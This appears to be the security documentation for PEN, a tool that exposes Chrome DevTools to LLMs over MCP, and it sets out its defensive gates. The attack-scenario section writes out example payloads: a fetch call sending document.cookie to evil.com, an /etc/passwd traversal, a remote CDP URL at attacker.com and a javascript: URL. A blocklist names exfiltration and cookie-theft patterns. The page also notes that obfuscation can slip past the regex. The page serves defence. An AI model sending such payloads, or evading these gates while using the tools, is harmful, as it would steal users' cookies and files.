# Security

PEN sits between CDP (full browser control), MCP (LLM-driven tool calls), and the local filesystem. Every boundary is locked down.

## Overview

| Boundary          | Threat                               | Defense                                            |
| ----------------- | ------------------------------------ | -------------------------------------------------- |
| MCP ← LLM         | Malicious eval, read sensitive files | Eval gating, expression blocklist, path validation |
| MCP ← LLM         | Navigate to dangerous URLs           | URL scheme validation                              |
| PEN → Chrome      | Full browser access                  | Localhost-only CDP                                 |
| PEN → File System | Temp files, path traversal           | Temp dir isolation, path checks                    |
| PEN → Network     | Source map fetching                  | Not implemented (by design)                        |

Any LLM connected over MCP can call any registered tool with whatever parameters it wants. The gates below stop misuse.

## Gate 1: Eval Gating

`pen_evaluate` is the scariest tool — it runs JS straight in the browser.

**Off by default.** It only exists if you pass `--allow-eval` at startup. Without that flag, the tool never shows up in `tools/list` and can’t be called.

## Gate 2: Expression Blocklist

Even with `--allow-eval` on, PEN blocks known-dangerous patterns:

| Pattern                | What it blocks            |
| ---------------------- | ------------------------- |
| `fetch(`               | Network exfiltration      |
| `XMLHttpRequest`       | Network exfiltration      |
| `navigator.sendBeacon` | Data beaconing            |
| `localStorage`         | Persistent storage access |
| `sessionStorage`       | Session storage access    |
| `document.cookie`      | Cookie theft              |
| `window.open(`         | Popup/redirect abuse      |
| `eval(`                | Dynamic code execution    |
| `Function(`            | Dynamic code execution    |
| `import(`              | Dynamic module loading    |

Unicode escape sequences (`\uXXXX`) are also rejected to prevent sneaking past the blocklist.

> This is defense-in-depth, not an airtight sandbox. A motivated attacker can dodge regex filters. The real protection is Gate 1: just don’t enable eval.

## Gate 3: Path Traversal Prevention

Source tools accept file paths. `ValidateSourcePath` stops traversal cold:

- Resolves the path to an absolute path
- Checks it's within the project root using `filepath.Rel`
- Handles case-insensitive filesystems and mixed separators
- Rejects any path that resolves outside the root

Temp files are validated separately — must be within `os.TempDir()/pen/`.

## Gate 4: CDP Localhost Restriction

PEN only connects to localhost (`localhost`, `127.0.0.1`, `::1`). Anything else is rejected before the MCP server even starts.

For remote browsers, use SSH tunneling:

```bash
ssh -L 9222:localhost:9222 user@remote-server
pen --cdp-url http://localhost:9222
```

## Gate 5: URL Scheme Validation

`pen_navigate` and `pen_lighthouse` validate URLs before any action:

| Blocked Scheme       | Why                         |
| -------------------- | --------------------------- |
| `javascript:`        | Code execution              |
| `data:`              | Arbitrary content rendering |
| `file:`              | Filesystem access           |
| `chrome:` / `about:` | Internal browser pages      |
| `ftp:`               | Unencrypted protocol        |
| `ws:` / `wss:`       | WebSocket connections       |
| `blob:`              | In-memory content           |
| `vbscript:`          | Legacy script execution     |

Only HTTP and HTTPS get through.

## Gate 6: Rate Limiting

Heavy tools get cooldowns to prevent runaway resource use:

| Tool                  | Cooldown |
| --------------------- | -------- |
| `pen_heap_snapshot`   | 10s      |
| `pen_capture_trace`   | 5s       |
| `pen_collect_garbage` | 5s       |

## Gate 7: Temp File Isolation

- Directory: `os.TempDir()/pen/` with `0700` permissions
- Files: `0600` permissions (owner-only read/write)
- Cleaned up on normal exit and on context cancellation via `defer`

## Gate 8: HTTP Transport

When using HTTP mode:

- Default bind: `localhost:6100` — not exposed to network
- Warning logged if binding to all interfaces
- No built-in auth — for network exposure, use a reverse proxy with auth

## Attack Scenarios

### LLM tries to exfiltrate data via eval

```json
{ "expression": "fetch('https://evil.com?d=' + document.cookie)" }
```

1. **Default:** Tool doesn’t exist. MCP says "unknown tool."
2. **With `--allow-eval`:** Blocked by the expression filter (`fetch(` pattern).
3. **Obfuscated:** Regex might miss it — which is exactly why Gate 1 (not enabling eval) is your real line of defense.

### Path traversal via source tools

```json
{ "urlPattern": "../../../../etc/passwd" }
```

`ValidateSourcePath` resolves to `/etc/passwd`, checks it against the project root, and rejects it.

### Rapid-fire heavy tool calls

```
pen_heap_snapshot → success
pen_heap_snapshot → blocked (cooldown: 10s)
```

### Remote CDP connection attempt

```bash
pen --cdp-url ws://attacker.com:9222/devtools/browser
```

Rejected at startup. PEN shuts down before the MCP server can even start.

### Malicious navigation

```json
{ "url": "javascript:alert(document.cookie)", "action": "goto" }
```

Blocked immediately. `javascript:` isn’t allowed. The request never reaches Chrome.

## Security Checklist

| Control                                     | Status |
| ------------------------------------------- | ------ |
| `pen_evaluate` requires `--allow-eval`      | ✅     |
| Expression blocklist + Unicode escape check | ✅     |
| Path traversal prevention (source paths)    | ✅     |
| Path traversal prevention (temp paths)      | ✅     |
| CDP restricted to localhost                 | ✅     |
| URL scheme validation (navigate/lighthouse) | ✅     |
| Temp files: 0600 perms, isolated dir        | ✅     |
| Temp files cleaned on exit                  | ✅     |
| Rate limiting on heavy operations           | ✅     |
| HTTP binds to localhost by default          | ✅     |
| Graceful shutdown on SIGINT/SIGTERM         | ✅     |

## Recommendations

- **Never enable `--allow-eval` in production** or untrusted environments
- **Always set `--project-root`** to limit source tool access
- **Never expose port 9222** to the network
- **Use SSH tunneling** for remote browsers
- **Use a reverse proxy with auth** if exposing PEN's HTTP transport
